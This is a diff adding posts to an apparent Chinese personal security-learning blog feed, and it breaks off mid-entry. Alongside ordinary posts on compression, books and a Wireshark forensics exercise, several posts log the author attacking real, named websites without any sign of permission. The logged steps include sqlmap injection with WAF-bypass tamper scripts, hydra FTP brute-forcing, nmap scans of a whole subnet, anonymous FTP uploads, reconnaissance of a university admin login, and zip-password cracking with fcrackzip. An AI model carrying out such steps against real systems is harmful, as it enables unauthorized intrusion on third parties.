@@ -5284,5 +5284,437 @@
   
   
   
+  <entry>
+    <title>方向比努力重要</title>
+    <link href="/2017/01/01/10-x/"/>
+    <url>/2017/01/01/10-x/</url>
+    
+    <content type="html"><![CDATA[<p>听说安全圈两极分化相当严重，水平高的大黑阔很少，水平低的“script Kid”就只会用工具。</p><p>在以前黑客都是计算机高手，但是现在计算机普及加上工具傻瓜化，随便的小学生都可以自称黑客黑网站。</p><p>了解黑箱里究竟发生了什么事情，并有能力改变是一个能力的分水岭。</p><p>前辈将工具写好，操作都告诉你了，得到了的结果都不是你的功劳，没什么稀奇的。</p><p><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/12-03-10/2883590-70a078bcc3a57d19.png"></p><p><em><strong>编程能力，思维，方向</strong><em>，</em><strong>基础，</strong></em></p><p>1，一个好的程序员并不等于一个好的黑客。</p><p>2，思维，运用别人发现的攻击方法，这条路走到最后，必然要找出属于自己路，创造新的攻击方法。</p><p>3，方向在我看来，就是条条大路通罗马中选择哪一条路的问题。</p><p>4，基础，就是要有能力操作，能理解原理。</p><p>庆祝洒家学习安全技术满一年！！！</p><p><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/12-03-10/2883590-6938d8ed2afaa9cd.png"></p><p>最近看了_<strong>微信公众号，懒人在思考</strong>_，在黑客入门这方面文章讲的很好啊，可以去看看。<br>下面这张图是我玩在线思维导图时候画的，虽然很不全面哈，有兴趣的也可以搜索一下在线思维导图。</p>]]></content>
+    
+    
+    <categories>
+      
+      <category>View</category>
+      
+    </categories>
+    
+    
+    <tags>
+      
+      <tag>View</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
+    <title>压缩与解压缩</title>
+    <link href="/2017/01/01/%E5%8E%8B%E7%BC%A9%E4%B8%8E%E8%A7%A3%E5%8E%8B%E7%BC%A9/"/>
+    <url>/2017/01/01/%E5%8E%8B%E7%BC%A9%E4%B8%8E%E8%A7%A3%E5%8E%8B%E7%BC%A9/</url>
+    
+    <content type="html"><![CDATA[<h2 id="字符集是一种约定"><a href="#字符集是一种约定" class="headerlink" title="字符集是一种约定"></a>字符集是一种约定</h2><p>在计算机中，所有的文件都以二进制的形态存在。我们的文字根据一些约定，来表示特定的符号。</p><blockquote><p><strong>ASCII</strong> 美国信息交换标准码（128个代码，用8bit代表一个代码，当然是不能表示中文的咯）</p><p><strong>Unicode</strong> 对ASCII的扩展（用16bit代表一个代码，解决了上百种语言的混乱）</p><p><strong>UTF-8</strong> 是对Unicode的升级版，为了解决16bit占用地址的问题。有些字符只需要用8bit表示，如果全部都用16bit表示，岂不是浪费了一倍的空间？所以UTF-8是可变长度的，能用8bit就不用16bit。</p></blockquote><p>由于在网络上传输数据，文件越小传输越快，和UTF-8类似，我们可以把一些重复的数据用简便的方法表示。</p><p>例如 111111111100000000 表示成 10180（10个1，8个0） 虽然例子不太严谨，反正压缩就是用更简便的方式表示数据，只要接受的另一端用同样的方式将数据还原，就可以了。</p><h2 id="常见压缩方法"><a href="#常见压缩方法" class="headerlink" title="常见压缩方法"></a>常见压缩方法</h2><p>下面看看linux支持的压缩方法。</p><h3 id="zip"><a href="#zip" class="headerlink" title="zip"></a>zip</h3><figure class="highlight stata"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs stata"><span class="hljs-keyword">zip</span> -P 123456 <span class="hljs-keyword">test</span>.<span class="hljs-keyword">zip</span> <span class="hljs-keyword">test</span>.txt    加密<span class="hljs-keyword">test</span>.txt<br>unzip -P 123456 -o <span class="hljs-keyword">test</span>.<span class="hljs-keyword">zip</span>         解密<span class="hljs-keyword">test</span>.<span class="hljs-keyword">zip</span><br></code></pre></div></td></tr></table></figure><blockquote><p>-o 直接覆盖原文件</p><p>-P 指定压缩密码</p><p>test.zip 指定压缩后文件名</p><p>test.txt 是要压缩的文件</p></blockquote><h3 id="gz"><a href="#gz" class="headerlink" title="gz"></a>gz</h3><p><strong>gzip 参数 文件名</strong></p><figure class="highlight node-repl"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs node-repl"><span class="hljs-meta">&gt;</span> <span class="javascript">-c 相当于cat命令吧？将压缩的文件输出到屏幕上</span><br><span class="hljs-meta">&gt;</span> <span class="javascript">-d  我以魔法小樱的名义命令你，解压缩！</span><br><span class="hljs-meta">&gt;</span> <span class="javascript">-t 检验文件有无压缩错误</span><br><span class="hljs-meta">&gt;</span> <span class="javascript">-v 显示文件压缩比等信息</span><br><span class="hljs-meta">&gt;</span> <span class="javascript">-number number是个可选项从<span class="hljs-number">1</span>到<span class="hljs-number">9</span>，数字越大压缩越慢，但压缩地比较多。如果不设置该选项，默认是<span class="hljs-number">6</span>。</span><br></code></pre></div></td></tr></table></figure><p>bzip2 是gzip的升级版，选项和上面一样。</p><blockquote><p>xz是bzip2的升级版，虽然说是升级版，但它们其实并没有什么关系啊，只是说压缩性能更加好而已。不过压缩能力越好，往往要花费更多的时间来压缩，所以性能时间自己权衡吧！</p></blockquote><h3 id="gz解压缩"><a href="#gz解压缩" class="headerlink" title="gz解压缩"></a>gz解压缩</h3><p><strong>gunzip xx.gz</strong></p><h2 id="tar"><a href="#tar" class="headerlink" title="tar"></a>tar</h2><p>在文件传输中，我们还要介绍一个指令tar。就像现实中要寄快递需要将你的文件打包一样，网络传输也需要打包一下。免得文件丢失或者遗忘。</p><figure class="highlight node-repl"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs node-repl"><span class="hljs-meta">&gt;</span> <span class="javascript">-c 打包！</span><br><span class="hljs-meta">&gt;</span> <br><span class="hljs-meta">&gt;</span> <span class="javascript">-z 使用gzip，或者 -j 使用bzip2，-J 使用xz</span><br><span class="hljs-meta">&gt;</span> <br><span class="hljs-meta">&gt;</span> <span class="javascript">-v 显示命令执行过程</span><br><span class="hljs-meta">&gt;</span> <br><span class="hljs-meta">&gt;</span> <span class="javascript">-f 指定归档文件名</span><br><span class="hljs-meta">&gt;</span> <br><span class="hljs-meta">&gt;</span> <span class="javascript">-t 查看文档</span><br><span class="hljs-meta">&gt;</span> <br><span class="hljs-meta">&gt;</span> <span class="javascript">-x 解压缩！</span><br><span class="hljs-meta">&gt;</span> <br></code></pre></div></td></tr></table></figure><h3 id="范例："><a href="#范例：" class="headerlink" title="范例："></a>范例：</h3><blockquote><p>tar -jcv -f app.tar.bz2     使用bzip2 压缩app.tar.bz2 的文件</p><p>tar -jtv -f  xx.tar.bz2       使用bzip2 查看xx.tar.bz2有哪些文档名</p><p>tar -zxvf xx.tar.gz  使用gzip解压缩xx.tar.gz、输出命令执行过程。</p><p>tar -cvf haha.tar shell/ 将shell目录已经目录下的文件打包成文件haha.tar</p></blockquote><h2 id="程序加密"><a href="#程序加密" class="headerlink" title="程序加密"></a>程序加密</h2><p>加壳与脱壳：由于压缩后的数据不可以识别，所以病毒木马也十分喜欢压缩呢。有个专有的名词叫做加壳，十分形象。总之就是用来保护程序的。</p><p>压缩壳有UPX、ASPack、PECompact</p><p>有些壳除了压缩，还有加密功能，例如ASProtect、Armadillo</p><h2 id="暴力破解压缩密码"><a href="#暴力破解压缩密码" class="headerlink" title="暴力破解压缩密码"></a>暴力破解压缩密码</h2><p>类似的软件有很多，这里推荐一个常kali自带的命令行程序。</p><figure class="highlight stata"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs stata">fcrackzip -<span class="hljs-keyword">h</span> 查看帮助<br>fcrackzip -<span class="hljs-keyword">D</span> -<span class="hljs-keyword">u</span> -p /root/Desktop/<span class="hljs-keyword">test</span>.txt xx.<span class="hljs-keyword">zip</span> 使用指定的密码字典，破解xx.<span class="hljs-keyword">zip</span><br></code></pre></div></td></tr></table></figure><p><a href="https://wiki.skullsecurity.org/Passwords">常用密码下载地址：https://wiki.skullsecurity.org/Passwords</a></p>]]></content>
+    
+    
+    <categories>
+      
+      <category>linux</category>
+      
+    </categories>
+    
+    
+    <tags>
+      
+      <tag>linux</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
+    <title>我的课程表2017</title>
+    <link href="/2017/01/01/%E6%88%91%E7%9A%84%E8%AF%BE%E7%A8%8B%E8%A1%A82017/"/>
+    <url>/2017/01/01/%E6%88%91%E7%9A%84%E8%AF%BE%E7%A8%8B%E8%A1%A82017/</url>
+    
+    <content type="html"><![CDATA[<p>自学，找出问题，提问</p><p>thinking by your own brain</p><p>doing by your own hand</p><p>raising up your own opinion</p><p>sharing with your partner</p><p>公开课：</p><p>哈佛大学公开课，计算机科学导论 </p><p>书籍资源：</p><p>内功《从python开始学编程》….已看完</p><div class="hljs code-wrapper"><pre><code>   《python核心编程》(第二版)《core python programming（2rd）》                          第二版比第三版对初学者更加友好，如果语言过关，建议读原版，翻译以及代码辣鸡。   《python高级编程》…… 39/324   《python源码剖析》 511 python是用c写的，当然也有其他语言实现的不过这里不提。这本书建议你写了很多c和c++程序和python脚本后再看。 《black hat python》 《gray hat python》87/209 《violent python A cookbook for hackers, Forensic Analysts, Penetration Testers and Security Engineers》                这本书，示例了各种用来暴力破解的脚本。只要需要密码的场合，可以使用脚本快速穷举正确密码。</code></pre></div><p>《穿越计算机的迷雾》…… 已看完</p><p>《程序员的自我修养》67/483</p><p>《c语言程序设计》孙亚飞，川大教科书。………已看完</p><p>《the c programming language》p59/295 </p><p>《鸟哥的linux私房菜》…… ing</p><p>《精通正则表达式》……</p><p>招式《木马技术揭秘与防御》黑客防线，2011出版…..page239.已看完（五颗星，从代码层面剖析了木马源码，由浅到深，适合新手）</p><div class="hljs code-wrapper"><pre><code>     《黑客攻防编程解析》黑防·.潘志翔2003年出版（两颗星，前部分基本东西讲了一堆，但实际操作却极度依赖IDE，可视化编程平台，不利于后续学习，容易把新手带歪。这本书只能参考参考）      《木马攻防全攻略》万立夫，2009年</code></pre></div><p>一本好书（这里指的是技术书籍）不应该仅仅是知识的堆砌，而是作者为读者考虑了并且将TA的思想在书中表达出来。一本书不可能囊括所有的东西，所以书的内容也要有指向性，懂的东西多说，不懂的东西少说或者不说。</p><p>书的好坏和出版时间也有一定关系吧，但是好的书一定是技术可能过时，但思想不会过时。一些书，可能作者罗列了一大堆知识，但从未自己思考过为什么、怎么来的，一旦书中的东西不再适应时代了，这本书就没有任何价值了。</p><p>一些书我看过以后打上等级，谨表个人意见。</p><p>技能点：提高编程能力。</p><p>从2017年1月1日开始执行，over。</p><p>2017年末总结，没想到，今年生了一场病还休学了。幸好的是，花费了几个月，我又恢复了健康。</p><p>这里要奉劝大家，不要等到失去健康才知道后悔，要注意保重身体啊！</p><p>学习方面，学得东西太散了，那谁说的没错，我应该专注一个小方面，而不是想什么都学一点……</p><p>11月27日更新。今年学习了python，从一窍不通到可以写出小脚本。不过要写攻击和检测程序还差得远。</p><p>关于c语言、汇编还有c++，自我感觉学了跟没学一样，根本不能用（融会贯通）。 </p><p>正则表达式和数据结构也大概学了下。。。没有投入足够的时间，倒不如说是方向不明确的学，导致效果不佳。</p><p>英语和colemak盲打得到了充分锻炼，自我感觉学的还不错。阅读文档勉勉强强，听力和写作还完全不行。</p>]]></content>
+    
+    
+    <categories>
+      
+      <category>experience</category>
+      
+    </categories>
+    
+    
+    <tags>
+      
+      <tag>experience</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
+    <title>wireshark</title>
+    <link href="/2016/12/23/wireshark/"/>
+    <url>/2016/12/23/wireshark/</url>
+    
+    <content type="html"><![CDATA[<p>::: {.container}<br>::: {.post}<br>::: {.show-content}<br>wireshark是网络封包分析软件。</p><p>基础：理解OSI七层模型</p><p>参考：<a href="http://www.cnblogs.com/TankXiao/archive/2012/10/10/2711777.html/#who">http://www.cnblogs.com/TankXiao/archive/2012/10/10/2711777.html\#who</a></p><p>这是我在暑假捕获邻居家wifi流量。当时看不懂，主要是不会用过滤器进行分析。下面我们结合题目进行过滤器的学习。\</p><p>::: {.image-package}<br><img src="http://upload-images.jianshu.io/upload_images/2883590-6fe75d412b62e83d.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">\</p><p>::: {.image-caption}<br><br>:::<br>:::</p><p><br>1，黑客最终获得什么用户名和密码？</p><p>这是在网站攻防里，要分析大量数据包，找到黑客暴力破解登陆网站后台的痕迹。</p><p>由于暴力破解必定要用工具爆破发送大量http请求，用post方法</p><p>原始样本里还有很多tcp和ftp请求。。先将http协议挑出来\</p><p>::: {.image-package}<br><img src="http://upload-images.jianshu.io/upload_images/2883590-a89068a5cf56f39c.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">\</p><p>::: {.image-caption}<br>:::<br>:::</p><p>。。http里包含登陆login字符的挑出来\</p><p>::: {.image-package}<br><img src="http://upload-images.jianshu.io/upload_images/2883590-592fdaa3d0874f31.png">\</p><p>::: {.image-caption}<br>:::<br>:::</p><p>。。<strong>用post提交用户名密码</strong>的数据包，挑出来</p><p>::: {.image-package}<br><img src="http://upload-images.jianshu.io/upload_images/2883590-4adc013a3578d2b6.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">\</p><p>::: {.image-caption}<br>:::<br>:::</p><p>。。将ip挑出来，就是大量发送登陆请求的那个</p><p>::: {.image-package}<br><img src="http://upload-images.jianshu.io/upload_images/2883590-ea06778a93a23a3a.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">\</p><p>::: {.image-caption}<br>:::<br>:::</p><p>这样我们就把，0.46个GB的pcap样本提取出了需要的部分。</p><h2 id="根据第二列"><a href="#根据第二列" class="headerlink" title="根据第二列"></a>根据第二列</h2><hr><p>时间，找到最后一组登陆的数据包，如上图所示，<em><strong>用户名为root,密码为123456。</strong></em></p><p>为了验证是否正确，我们追踪一下数据流，发现前面爆破的数据包，显示重定向回登陆页面（就是下面靠近底部的redirect，看见没）。显然前面的都是登陆失败的。\</p><p>::: {.image-package}<br><img src="http://upload-images.jianshu.io/upload_images/2883590-1209d989c191db46.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">\</p><p>::: {.image-caption}<br>:::<br>:::</p><p>下图，左边是登陆成功的数据包显示乱码，，也不知道为什么。右边是未成功登陆的页面\</p><p>::: {.image-package}<br><img src="http://upload-images.jianshu.io/upload_images/2883590-61eddc16215cbf99.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">\</p><p>::: {.image-caption}<br><br>:::<br>:::</p><hr><hr><hr><hr><hr><hr><hr><hr><hr><hr><hr><hr><hr><hr><hr><hr><hr><hr><hr><hr><hr><hr><hr><hr><p>2，黑客修改了什么文件？菜刀连接地址？连接密码？</p><p>打开第二个pcap文件，用http和ip过滤。</p><p>下图所示，表明一直在访问index.php，一般来说就是首页。访问了menuid=4...5...6等等，在最下面发现了访问一个可疑的参数a=edit_file，file=index.html。猜测修改的文件为index.html\</p><p>::: {.image-package}<br><img src="http://upload-images.jianshu.io/upload_images/2883590-51e38d156d3b5514.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">\</p><p>::: {.image-caption}<br>:::<br>:::</p><p>::: {.image-package}<br><img src="http://upload-images.jianshu.io/upload_images/2883590-386b53593042252f.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">\</p><p>::: {.image-caption}<br><br>:::<br>:::</p><hr><hr><hr><hr><hr><hr><hr><hr><hr><hr><hr><hr><hr><hr><hr><hr><hr><hr><hr><hr><hr><hr><hr><hr><p>一直没有发现什么踪迹，被包围在漫天遍野的数据包里，迷失了方向许久。。终于在第五个pcap文件里发现了痕迹。\</p><p>::: {.image-package}<br><img src="http://upload-images.jianshu.io/upload_images/2883590-e288a5ad8418fba3.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">\</p><p>::: {.image-caption}<br>:::<br>:::</p><p>所以菜刀连接地址为<a href="http://172.16.61.210/index.php%EF%BC%88%E6%A0%BC%E5%BC%8F%E4%B8%BA%E7%9B%AE%E6%A0%87IP%E5%8A%A0%E4%B8%8A%E4%BC%A0%E7%9A%84php%E6%96%87%E4%BB%B6%E5%9C%B0%E5%9D%80%EF%BC%89,%E8%BF%9E%E6%8E%A5%E5%AF%86%E7%A0%81%E4%B8%BAchopper/">http://172.16.61.210/index.php（格式为目标IP加上传的php文件地址）,连接密码为chopper\</a></p><p>::: {.image-package}<br><img src="http://upload-images.jianshu.io/upload_images/2883590-fe4c3fb1b9192d66.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">\</p><p>::: {.image-caption}<br>:::<br>:::<br>:::<br>:::<br>:::</p>]]></content>
+    
+    
+    <categories>
+      
+      <category>tools</category>
+      
+    </categories>
+    
+    
+    <tags>
+      
+      <tag>tools</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
+    <title>Access数据库实践</title>
+    <link href="/2016/12/09/Access%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%9E%E8%B7%B5/"/>
+    <url>/2016/12/09/Access%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%9E%E8%B7%B5/</url>
+    
+    <content type="html"><![CDATA[<p>::: {.container}<br>::: {.post}<br>::: {.show-content}<br>用google语法，找到一个注入点。用ｓｑｌｍａｐ检测一下。</p><p>sqlmap显示，在access数据库中，列举数据库名称是不可能的，让我们直接列举表名。</p><p>真的等了有蛮久。。是穷举吗，最后得出了数据库名称，和表名。</p><p>::: {.image-package}<br><img src="http://upload-images.jianshu.io/upload_images/2883590-2c749a42f54591e0.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">\</p><p>::: {.image-caption}<br>:::<br>:::</p><p>接下来列名。</p><p>::: {.image-package}<br><img src="http://upload-images.jianshu.io/upload_images/2883590-0f07866c9cb050ca.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">\</p><p>::: {.image-caption}<br>:::<br>:::</p><hr><hr><hr><hr><hr><hr><hr><hr><hr><hr><hr><hr><hr><hr><hr><hr><hr><hr><hr><hr><hr><hr><hr><hr><p>以及列名中的数据。</p><p>::: {.image-package}<br><img src="http://upload-images.jianshu.io/upload_images/2883590-63a6f0a0dcaf9cac.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">\</p><p>::: {.image-caption}<br>:::<br>:::</p><p>::: {.image-package}<br><img src="http://upload-images.jianshu.io/upload_images/2883590-82fb44d4ef2b7e3a.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">\</p><p>::: {.image-caption}<br>:::<br>:::</p><p>没找到后台。</p><hr><hr><hr><hr><hr><hr><hr><hr><hr><hr><hr><hr><hr><hr><hr><hr><hr><hr><hr><hr><hr><hr><hr><hr><p>2017.10.22 更新</p><p>进行信息收集。在网页后方加 /foot.asp   了解该网页制作时间是七八年前。</p><p>/uploadfile   403禁止访问，看来基本的安全措施是做了的</p><blockquote><p>Directory Listing Denied</p><p>This Virtual Directory does not allow contents to be listed.</p></blockquote><p>操作系统：Microsoft Windows 2003|XP (92%)</p><p>开放端口：21（ftp）、80（http）</p><p>开放具体服务版本：</p><blockquote><p>nmap　域名　-sV -p 21,80</p><p>21/tcp open  ftp    Microsoft ftpd</p><p>80/tcp open  http    Microsoft IIS httpd 6.0</p></blockquote><p>nmap --script=vuln www.域名马赛克.org</p><blockquote><p>http-csrf:</p><p>| Spidering limited to: maxdepth=3; maxpagecount=20;<br>withinhost=域名马赛克</p><p>|  Found the following <strong>possible CSRF vulnerabilities:</strong></p><p>|    Path: <a href="http://www.域名马赛克/ly.asp">http://www.域名马赛克/ly.asp</a></p><p>|    Form id:</p><p>|_    Form action: messageok.asp?actopt=add</p><p>|_http-dombased-xss: Couldn&#39;t find any DOM based XSS.</p></blockquote><p>whatweb -v　域名</p><p>没有探测到什么特别的信息，结果基本符合上面探测的内容。</p><hr><hr><hr><hr><hr><hr><hr><hr><hr><hr><hr><hr><hr><hr><hr><hr><hr><hr><hr><hr><hr><hr><hr><hr><p>sqlmap -u &quot;<a href="http://www.xxx.org/yyjshow.asp?id=1429&amp;ctype=%C3%92%C3%B4%C3%80%C3%96%C2%BC%C2%BE%5C&quot;">http://www.xxx.org/yyjshow.asp?id=1429&amp;ctype=ÒôÀÖ¼¾\&quot;</a><br>--dbms &quot;Microsoft Access&quot; --level 3</p><p>再次注入，发现该网站加了一个ｗａｆ。。。虽然可以用ｓｑｌｍａｐ绕过，但是请求过多就会拒绝连接。于是。。。</p><p>sqlmap -u &quot;<a href="http://www.xxxxx.org/yyjshow.asp?id=1429&amp;ctype=%C3%92%C3%B4%C3%80%C3%96%C2%BC%C2%BE%5C&quot;">http://www.xxxxx.org/yyjshow.asp?id=1429&amp;ctype=ÒôÀÖ¼¾\&quot;</a><br>--dbms &quot;Microsoft Access&quot; --level 3 --tamper charunicodeencode.py<br>space2comment.py --tables</p><blockquote><p>[22:14:40] [ERROR] <strong>cannot retrieve table names</strong>, back-end DBMS<br>is Access</p><p>do you want to use common table existence check? [Y/n/q] y</p><p>这种枚举方式有３０００多个表，而且连接经常断掉，所以暂时放弃。</p><p>获得一个存在的表　user</p></blockquote><p>ftp爆破：hydra ip ftp -L 用户名.txt -P 密码.txt -t 线程(默认16) -vV</p><p>检查Ｃ段</p><p>nmap -sV 61.155.154.* -oX myscan.xml</p><p>全部是在线的，而且都是ｗｉｎｄｏｗｓ，开端口21、80.</p><p><a href="https://www.jianshu.com/p/3bc51d1eb6dc">ftp匿名登录扫描</a>，扫到了２个。。真是好运气</p><p>xx.xx.xx.xx:     21 - Anonymous READ (220-Microsoft FTP Service 220)</p><blockquote><p>ftp  xxx.xxx.xx.xx</p><p>anonymous</p><p>ls</p><p>put /root/Desktop/xx.py</p></blockquote><p>两个ｆｔｐ服务器上，没发现任何文件，而且没有写权限。</p><p>啊啊～溢出溢出不会。</p><p>待续<br>:::<br>:::<br>:::</p>]]></content>
+    
+    
+    
+  </entry>
+  
+  
+  
+  <entry>
+    <title>搜集信息的实践20160925</title>
+    <link href="/2016/12/01/%E6%90%9C%E9%9B%86%E4%BF%A1%E6%81%AF%E7%9A%84%E5%AE%9E%E8%B7%B520160925/"/>
+    <url>/2016/12/01/%E6%90%9C%E9%9B%86%E4%BF%A1%E6%81%AF%E7%9A%84%E5%AE%9E%E8%B7%B520160925/</url>
+    
+    <content type="html"><![CDATA[<p>::: {.container}<br>::: {.post}<br>::: {.show-content}<br>1，网站是静态还是动态。用什么脚本语言编写的。<br>=============================================</p><p>静态网站，地址栏后缀，一般是html</p><p>动态网站，php等。动态网站不同的人不同的时间登陆，看到的网站都不太一样。</p><p>静态网站，无论是谁登陆，什么时候登陆，网页都是一样的。就好比方动物标本。一旦制作完成，就不变了。</p><p>::: {.image-package}<br><img src="http://upload-images.jianshu.io/upload_images/2883590-eb75aedd0cc75f6f.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">\</p><p>::: {.image-caption}<br>:::<br>:::</p><p>aspx,说明是动态网站，用的是asp脚本语言。</p><h1 id="2，web服务器类型"><a href="#2，web服务器类型" class="headerlink" title="2，web服务器类型 "></a>2，web服务器类型 </h1><p>\</p><p>::: {.image-package}<br><img src="http://upload-images.jianshu.io/upload_images/2883590-146523a14dba5332.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">\</p><p>::: {.image-caption}<br>我们在地址栏随便输入个什么，发现错误网页显示，信息服务IIS<br>:::<br>:::</p><p>所以web服务器类型为，IIS服务器</p><h1 id="3，是否为cms"><a href="#3，是否为cms" class="headerlink" title="3，是否为cms"></a>3，是否为cms</h1><p>Content Management System,内容管理系统，是方便建站的一个程序。</p><p>不是。</p><h1 id="4，是否开启CDN。"><a href="#4，是否开启CDN。" class="headerlink" title="4，是否开启CDN。"></a>4，是否开启CDN。</h1><p>如果网站<em><strong>没有开启</strong></em>CDN，不同地区Ping网址是网站<em><strong>服务器的真实地址</strong></em>，如果开启了CDN加速，网站内容会缓存到各地区离你最近的服务器，所以访问IP会发生变化，根据这个原理，就很容易判断网站是否开启了CDN了。\</p><p><a href="http://www.17ce.com/site/cdn.html/">http://www.17ce.com/site/cdn.html\</a></p><p>在线识别网站。</p><p>结果，没有开启，真实IP为202.115.54.22</p><h1 id="5，是否有robots-txt文件"><a href="#5，是否有robots-txt文件" class="headerlink" title="5，是否有robots.txt文件"></a>5，是否有robots.txt文件</h1><p>robots协议，网络爬虫排除标准，告诉搜索引擎哪些页面可以抓取，哪些页面不能。</p><p>没有。</p><h1 id="6，开放端口"><a href="#6，开放端口" class="headerlink" title="6，开放端口"></a>6，开放端口</h1><p>在线扫描网站，站长之家，21，23端口开放，其他端口关闭。(结果这个网站扫描结果不准确，，）</p><p>方法二，nmap扫描器，80端口开放。</p><h1 id="后台登陆界面"><a href="#后台登陆界面" class="headerlink" title="后台登陆界面"></a>后台登陆界面</h1><p><a href="http://lib.scu.edu.cn/manage/login.aspx/">http://lib.scu.edu.cn/manage/login.aspx\</a><br>:::<br>:::<br>:::</p>]]></content>
+    
+    
+    <categories>
+      
+      <category>training</category>
+      
+    </categories>
+    
+    
+    <tags>
+      
+      <tag>training</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
+    <title>熟练信息搜集工具</title>
+    <link href="/2016/12/01/%E7%86%9F%E7%BB%83%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86%E5%B7%A5%E5%85%B7/"/>
+    <url>/2016/12/01/%E7%86%9F%E7%BB%83%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86%E5%B7%A5%E5%85%B7/</url>
+    
+    <content type="html"><![CDATA[<p>::: {.container}<br>::: {.post}<br>::: {.show-content}<br>目标域名：<a href="http://www.lwxs520.com/">http://www.lwxs520.com</a></p><p>2018.2.10 发现域名换了，<a href="http://www.lwxiaoshuo.com/">http://www.lwxiaoshuo.com</a></p><p>后台：<a href="http://www.lwxs520.com/loginframe.php%EF%BC%8817-03-27%E5%87%86%E5%A4%87%E6%9A%B4%E7%A0%B4%EF%BC%8C%E5%8F%91%E7%8E%B0%E8%BF%99%E4%B8%8D%E6%98%AF%E4%B8%80%E4%B8%AA%E5%90%8E%E5%8F%B0%E3%80%82%E3%80%82%E7%90%86%E7%94%B1%EF%BC%8C%E6%9C%89%E6%B3%A8%E5%86%8C%E9%93%BE%E6%8E%A5%EF%BC%89">http://www.lwxs520.com/loginframe.php（17-03-27准备暴破，发现这不是一个后台。。理由，有注册链接）</a></p><p>1,目标网站是<strong>动态网站</strong>，使用<strong>PHP脚本语言</strong>。</p><p>2，服务器类型</p><p>服务器操作系统类型：windows sever 2008      /    Microsoft-IIS/7.5</p><p>3，是否为CMS</p><p>::: {.image-package}<br><img src="http://upload-images.jianshu.io/upload_images/2883590-71f622b320fb3e6c.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">\</p><p>::: {.image-caption}<br>:::<br>:::</p><p>4，是否开启CDN</p><p>。。？应该是否吧。</p><p>虽然是美国的服务器，但各个地区ping的地址是一样的。</p><p>ip为192.126.112.200</p><p>::: {.image-package}<br><img src="http://upload-images.jianshu.io/upload_images/2883590-088c9bfa10f56c5e.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">\</p><p>::: {.image-caption}<br>:::<br>:::</p><hr><hr><hr><hr><hr><hr><hr><hr><hr><hr><hr><hr><hr><hr><hr><hr><hr><hr><hr><hr><hr><hr><hr><hr><p>5.是否有robot.txt文件</p><p>::: {.image-package}<br><img src="http://upload-images.jianshu.io/upload_images/2883590-46e87c8f3b2c762f.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">\</p><p>::: {.image-caption}<br>:::<br>:::</p><p>6,开放端口。</p><p>。。? IP好像有点不对。探测的端口全部过滤。</p><p>::: {.image-package}<br><img src="http://upload-images.jianshu.io/upload_images/2883590-7c38d53baf504b9f.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">\</p><p>::: {.image-caption}<br>:::<br>:::</p><hr><hr><hr><hr><hr><hr><hr><hr><hr><hr><hr><hr><hr><hr><hr><hr><hr><hr><hr><hr><hr><hr><hr><hr><p>theharvester,找邮箱。。感觉邮箱哪里不对。并发现了另一些IP</p><p>::: {.image-package}<br><img src="http://upload-images.jianshu.io/upload_images/2883590-5c6825b2ffe77c3c.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">\</p><p>::: {.image-caption}<br>:::<br>:::</p><hr><hr><hr><hr><hr><hr><hr><hr><hr><hr><hr><hr><hr><hr><hr><hr><hr><hr><hr><hr><hr><hr><hr><hr><p>本来想找后台，没想到在这种浏览向的网站，页面实在太多。。也没想到robots.txt这么简单就指出了后台。</p><p>::: {.image-package}<br><img src="http://upload-images.jianshu.io/upload_images/2883590-1a5c0e42ddd43512.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">\</p><p>::: {.image-caption}<br>:::<br>:::</p><hr><hr><hr><hr><hr><hr><hr><hr><hr><hr><hr><hr><hr><hr><hr><hr><hr><hr><hr><hr><hr><hr><hr><hr><p>netscraft查询</p><p>::: {.image-package}<br><img 